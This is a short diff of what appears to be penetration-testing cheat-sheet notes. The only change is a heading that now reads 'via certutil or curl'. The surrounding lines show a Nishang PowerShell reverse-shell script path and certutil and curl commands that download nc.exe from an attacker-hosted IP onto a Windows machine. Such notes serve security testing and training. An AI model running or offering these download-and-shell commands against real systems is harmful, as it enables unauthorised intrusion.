@@ -401,7 +401,7 @@ or
 > 1. where shell.ps1 is:
 > 1. /usr/share/nishag/Shells/Invoke-PowerShellTcp.ps1
 
-##### Download a file in Windows via certutil
+##### Download a file in Windows via certutil or curl
 > 1. ```certutil -urlcache -split -f http://192.168.10.100/nc.exe nc.exe```
 > 1. *Windows 10* ```curl -o nc.exe http://192.168.49.176/nc.exe```
 
